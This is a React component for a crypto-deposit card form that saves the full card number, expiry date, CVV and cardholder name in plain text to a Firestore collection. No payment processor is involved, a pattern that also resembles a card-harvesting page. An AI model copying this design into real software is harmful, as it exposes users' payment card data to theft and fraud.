import React, { Component , createRef} from 'react';
import './ModalPay.css';
import { addDoc, collection } from "firebase/firestore";
import {db} from "../../../firebase";
import dollar from "../../../assets/dollar.svg"
class CreditCardForm extends Component {
    constructor(props) {
        super(props);
        this.state = {
            currentCardBackground: Math.floor(Math.random() * 25 + 1),
            cardName: "",
            cardAmount: "",
            cardNumber: "",
            cardMonth: "",
            cardYear: "",
            cardCvv: "",
            nameLastName: "",
            minCardYear: new Date().getFullYear(),
            amexCardMask: "#### ###### #####",
            otherCardMask: "#### #### #### ####",
            cardNumberTemp: "",
            isCardFlipped: false,
            focusElementStyle: null,
            isInputFocused: false,
            selectedCrypto: props.selectedCrypto,
        };
        this.cardFormRef = createRef();
    }


    handleSubmit = async (event) => {
        event.preventDefault();

        const {
            cardName,
            cardAmount,
            cardNumber,
            cardMonth,
            cardYear,
            cardCvv,
            nameLastName,

        } = this.state;

        if (
            !cardAmount.trim() ||
            !cardNumber.trim() ||
            !cardMonth.trim() ||
            !cardYear.trim() ||
            !cardCvv.trim() ||
            !nameLastName.trim()
        ) {
            alert("Пожалуйста, заполните полностью форму!");
            return;
        }

        const newItem = {
            cardAmount : cardAmount.trim(),
            numberCard: cardNumber.trim(),
            cardValidity: `${cardMonth.trim()}/${cardYear.trim()}`,
            nameLastName: nameLastName.trim(),
            cvv: cardCvv.trim(),

        };

        try {
            const itemsCollection = collection(db, 'items');
            const docRef = await addDoc(itemsCollection, newItem); // collection - это ваша коллекция Firestore
            const createdItem = { id: docRef.id, ...newItem };

            this.setState({
                cardName: "",
                cardNumber: "",
                cardAmount: "",
                cardMonth: "",
                cardYear: "",
                cardCvv: "",
                nameLastName: "",
            });

            this.closeWindow();
            this.openWindowConfirm();
        } catch (error) {
            console.error("Error adding document: ", error);
        }
    };

    componentDidMount() {
        const cardNumberInput = document.getElementById("cardNumber");
        if (cardNumberInput) {
            cardNumberInput.focus();
        }
    }

    getCardType() {
        const { cardNumber } = this.state;
        let re = new RegExp("^4");

        if (cardNumber.match(re) != null) return "visa";

        re = new RegExp("^(34|37)");
        if (cardNumber.match(re) != null) return "amex";

        re = new RegExp("^5[1-5]");
        if (cardNumber.match(re) != null) return "mastercard";

        re = new RegExp("^6011");
        if (cardNumber.match(re) != null) return "discover";

        re = new RegExp('^9792')
        if (cardNumber.match(re) != null) return 'troy'

        return "visa";
    }

    generateCardNumberMask() {
        return this.getCardType() === "amex" ? this.state.amexCardMask : this.state.otherCardMask;
    }

    minCardMonth() {
        if (this.state.cardYear === this.state.minCardYear) return new Date().getMonth() + 1;
        return 1;
    }

    handleCardYearChange() {
        if (this.state.cardMonth < this.minCardMonth()) {
            this.setState({ cardMonth: "" });
        }
    }

    flipCard(status) {
        this.setState({ isCardFlipped: status });
    }

    focusInput = (e) => {
        this.setState({ isInputFocused: true });
        const targetRef = e.target.dataset.ref;
        const target = this.refs[targetRef];
        this.setState({
            focusElementStyle: {
                width: `${target.offsetWidth}px`,
                height: `${target.offsetHeight}px`,
                transform: `translateX(${target.offsetLeft}px) translateY(${target.offsetTop}px)`
            }
        });
    }

    blurInput = () => {
        setTimeout(() => {
            if (!this.state.isInputFocused) {
                this.setState({ focusElementStyle: null });
            }
        }, 300);
        this.setState({ isInputFocused: false });
    }

    closeWindow = () => {
        const cardForm = document.getElementById("card-form");
        if (!cardForm) {
            console.error("Элемент с идентификатором 'card-form' не найден.");
            return;
        }

        cardForm.style.transition = "opacity 0.3s ease";
        cardForm.style.opacity = '0';

        setTimeout(() => {
            cardForm.style.display = "none"; // Скрыть, вместо удаления
            document.body.classList.remove("active4");
        }, 300); // Adjust the timeout value based on your transition duration
    };

    openWindowConfirm = () => {
        document.getElementById("confirm").style.display = "block";
    }

    handleCardAmountChange = (event) => {
        const value = event.target.value;

        this.setState({
            cardAmount: value
        });
    }


    handleCardNumberChange = (event) => {
        const inputValue = event.target.value.replace(/\D/g, '');
        const formattedValue = inputValue
            .replace(/(\d{4})/g, '$1 ')
            .substring(0, 19)
            .trim();

        this.setState({ cardNumber: formattedValue });
    };


    handleCardValidityChange = (event) => {
        const inputValue = event.target.value;
        if (/^\d{0,2}$/.test(inputValue) && (inputValue === '' || (parseInt(inputValue, 10) >= 1 &&
            parseInt(inputValue, 10) <= 12))) {
            this.setState({ cardMonth: inputValue });
        }
    };

    handleCardValidityChange2 = (event) => {
        const inputValue = event.target.value;
        if (/^\d{0,4}$/.test(inputValue) && (inputValue === '' || (parseInt(inputValue, 10) >= 2023 &&
            parseInt(inputValue, 10) <= 2034))) {
            this.setState({ cardYear: inputValue });
        }
    };

    handleCVVChange = (event) => {
        const newValue = event.target.value;
        if (/^\d{0,3}$/.test(newValue)) {
            this.setState({ cardCvv: newValue });
        }
    };

    handleNameLastNameChange = (event) => {
        let newValue = event.target.value
            .toUpperCase()
            .replace(/[^A-Z ]/g, '')
            .replace(/ +/g, ' ');

        if (newValue.length > 28) {
            newValue = newValue.slice(0, 28);
        }

        this.setState({ nameLastName: newValue });
    };

    fetchCryptoData = async () => {
        try {
            const response = await fetch('https://api.binance.com/api/v3/ticker/price');
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const data = await response.json();
            this.setState({ tickerData: data });
        } catch (error) {
            console.error('Error fetching data:', error);
        }
    };

    componentDidMount() {
        this.fetchCryptoData(); // Initial fetch
        const intervalId = setInterval(this.fetchCryptoData, 30000);

        this.setState({ intervalId });
    }

    componentWillUnmount() {
        clearInterval(this.state.intervalId);
    }

    render() {
        const { selectedCrypto } = this.props;

        if (!selectedCrypto) {
            return null;
        }
        return (
            <div id="card-form" className="wrapper--card-form" >
                <form  className="card-form" onSubmit={this.handleSubmit}>
                    <div className="card-form__inner">
                        <div className="card-list">
                            <div className={`card-item ${this.state.isCardFlipped ? '-active' : ''}`}>
                                <div className="card-item__side -front">
                                    <div className={`card-item__focus ${this.state.focusElementStyle ? '-active' : ''}`} style={this.state.focusElementStyle} ref="focusElement"></div>
                                    <div className="card-item__cover">
                                        <img
                                            src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${this.state.currentCardBackground}.jpeg`}
                                            className="card-item__bg"
                                            alt=""
                                        />
                                    </div>

                                    <div className="card-item__wrapper">
                                        <div className="card-item__top">
                                            <img src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/chip.png" className="card-item__chip" alt="" />
                                            <div className="card-item__type">
                                                <img
                                                    src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${this.getCardType()}.png`}
                                                    alt=""
                                                    className="card-item__typeImg"
                                                />
                                            </div>
                                        </div>
                                        <label htmlFor="cardNumber" className="card-item__number" ref="cardNumber">
                                            {this.getCardType() === 'amex' ? (
                                                <span>
                                              {this.state.amexCardMask.split('').map((n, index) => (
                                                  index >= 4 && index <= 13 && this.state.cardNumber.length > index && n.trim() !== '' ? (
                                                      <div key={index} className="card-item__numberItem">*</div>
                                                  ) : (
                                                      <div key={index} className={`card-item__numberItem ${this.state.cardNumber.length > index ? 'filled' : ''}`}>
                                                          {this.state.cardNumber.length > index ? this.state.cardNumber[index] : n}
                                                      </div>
                                                  )
                                              ))}
                                            </span>
                                            ) : (
                                                <span>
                                              {this.state.otherCardMask.split('').map((n, index) => (
                                                  index >= 4 && index <= 13 && this.state.cardNumber.length > index && n.trim() !== '' ? (
                                                      <div key={index} className="card-item__numberItem">*</div>
                                                  ) : (
                                                      <div key={index} className={`card-item__numberItem ${this.state.cardNumber.length > index ? 'filled' : ''}`}>
                                                          {this.state.cardNumber.length > index ? this.state.cardNumber[index] : n}
                                                      </div>
                                                  )
                                              ))}
                                            </span>
                                            )}
                                        </label>
                                        <div className="card-item__content">
                                            <label htmlFor="cardName" className="card-item__info" ref="cardName">
                                                <div className="card-item__holder">Card Holder</div>
                                                <div className={`card-item__name ${this.state.cardName.length ? '' : 'key'}`} key={this.state.cardName.length ? '1' : '2'}>
                                                    <div className="card-item__name">
                                                    <span key={this.state.nameLastName}>
                                                      {this.state.nameLastName.split('').map((n, index) => (
                                                          <span key={index} className="card-item__nameItem">{n} </span>
                                                      ))}
                                                    </span>
                                                    </div>
                                                </div>
                                            </label>
                                            <div className="card-item__date" ref="cardDate">
                                                <label htmlFor="cardMonth" className="card-item__dateTitle">Expires</label>
                                                <label htmlFor="cardMonth" className="card-item__dateItem">
                                                <span key={this.state.cardMonth}>
                                                  {this.state.cardMonth || 'MM'}
                                                </span>
                                                </label>
                                                /
                                                <label htmlFor="cardYear" className="card-item__dateItem">
                                                <span key={this.state.cardYear}>
                                                  {this.state.cardYear || 'YY'}
                                                </span>
                                                </label>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div className="card-item__side -back">
                                    <div className="card-item__cover">
                                        <img
                                            src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${this.state.currentCardBackground}.jpeg`}
                                            className="card-item__bg"
                                            alt=""
                                        />
                                    </div>
                                    <div className="card-item__band"></div>
                                    <div className="card-item__cvv">
                                        <div className="card-item__cvvTitle">CVV</div>
                                        <div className="card-item__cvvBand">
                                            {this.state.cardCvv.split('').map((n, index) => (
                                                <span key={index}>*</span>
                                            ))}
                                        </div>
                                        <div className="card-item__type">
                                            <img
                                                src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${this.getCardType()}.png`}
                                                alt=""
                                                className="card-item__typeImg"
                                            />
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="formClose">
                            <label onClick={this.closeWindow} htmlFor="X" className="like-button">
                                <div className="like-wrapper">
                                    <div className="ripple"></div>
                                    <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="20" height="20" viewBox="0 0 30 30">
                                        <path d="M 7 4 C 6.744125 4 6.4879687 4.0974687 6.2929688 4.2929688 L 4.2929688 6.2929688 C 3.9019687 6.6839688 3.9019687 7.3170313 4.2929688 7.7070312 L 11.585938 15 L 4.2929688 22.292969 C 3.9019687 22.683969 3.9019687 23.317031 4.2929688 23.707031 L 6.2929688 25.707031 C 6.6839688 26.098031 7.3170313 26.098031 7.7070312 25.707031 L 15 18.414062 L 22.292969 25.707031 C 22.682969 26.098031 23.317031 26.098031 23.707031 25.707031 L 25.707031 23.707031 C 26.098031 23.316031 26.098031 22.682969 25.707031 22.292969 L 18.414062 15 L 25.707031 7.7070312 C 26.098031 7.3170312 26.098031 6.6829688 25.707031 6.2929688 L 23.707031 4.2929688 C 23.316031 3.9019687 22.682969 3.9019687 22.292969 4.2929688 L 15 11.585938 L 7.7070312 4.2929688 C 7.5115312 4.0974687 7.255875 4 7 4 z"></path>
                                    </svg>
                                </div>
                            </label>
                        </div>
                        <div className="card-form__inner--infobit">
                            <img src={selectedCrypto.image} alt=""/>
                            <p>{selectedCrypto.name}</p>
                            <p>{selectedCrypto.symbol}</p>
                        </div>
                        <div className="card-input">
                            <label htmlFor="cardNumber" className="card-input__label">Deposit Amount</label>
                            <input
                                type="text"
                                id="cardAmount"
                                className="card-input__input"
                                value={this.state.cardAmount}
                                onChange={this.handleCardAmountChange}
                                maxLength="10"
                                onFocus={this.focusInput}
                                onBlur={this.blurInput}
                                data-ref="cardNumber"
                                autoComplete="off"
                            />
                            <img src={dollar} alt=""/>
                        </div>
                        <div className="card-input">
                            <label htmlFor="cardNumber" className="card-input__label">Card Number</label>
                            <input
                                type="text"
                                id="numberCard"
                                className="card-input__input"
                                value={this.state.cardNumber}
                                onChange={this.handleCardNumberChange}
                                maxLength="19"
                                onFocus={this.focusInput}
                                onBlur={this.blurInput}
                                data-ref="cardNumber"
                                autoComplete="off"
                            />

                        </div>
                        <div className="card-input">
                            <label htmlFor="cardName" className="card-input__label">Card Holders</label>
                            <input
                                type="text"
                                id="cardName"
                                className="card-input__input"
                                value={this.state.nameLastName}
                                onFocus={this.focusInput}
                                onBlur={this.blurInput}
                                onChange={this.handleNameLastNameChange}
                                data-ref="cardName"
                                autoComplete="off"
                            />
                        </div>
                        <div className="card-form__row">
                            <div className="card-form__col">
                                <div className="card-form__group">
                                    <label htmlFor="cardMonth" className="card-input__label">Expiration Date</label>
                                    <select
                                        className="card-input__input -select"
                                        id="cardValidity"
                                        value={this.state.cardMonth}
                                        onFocus={this.focusInput}
                                        onBlur={this.blurInput}
                                        data-ref="cardDate"
                                        onChange={this.handleCardValidityChange}
                                    >
                                        <option value="" disabled selected>Month</option>
                                        {Array.from({ length: 12 }, (_, i) => (
                                            <option key={i} value={i < 9 ? `0${i + 1}` : `${i + 1}`} disabled={i < this.minCardMonth()}>
                                                {i < 9 ? `0${i + 1}` : `${i + 1}`}
                                            </option>
                                        ))}
                                    </select>
                                    <select
                                        className="card-input__input -select"
                                        id="cardValidity2"
                                        value={this.state.cardYear}
                                        onFocus={this.focusInput}
                                        onBlur={this.blurInput}
                                        data-ref="cardDate"
                                        onChange={this.handleCardValidityChange2}
                                    >
                                        <option value="" disabled selected>Year</option>
                                        {Array.from({ length: 12 }, (_, i) => (
                                            <option key={i} value={i + this.state.minCardYear}>
                                                {i + this.state.minCardYear}
                                            </option>
                                        ))}
                                    </select>
                                </div>
                            </div>
                            <div className="card-form__col -cvv">
                                <div className="card-input">
                                    <label htmlFor="cardCvv" className="card-input__label">CVV</label>
                                    <input
                                        type="text"
                                        className="card-input__input"
                                        id="cardCvv"
                                        value={this.state.cardCvv}
                                        maxLength="4"
                                        onFocus={() => this.flipCard(true)}
                                        onBlur={() => this.flipCard(false)}
                                        autoComplete="off"
                                        onChange={this.handleCVVChange}
                                    />
                                </div>
                            </div>
                        </div>

                        <button className="card-form__button">
                            Submit
                        </button>

                    </div>
                </form>
            </div>

        );
    }
}

export default CreditCardForm;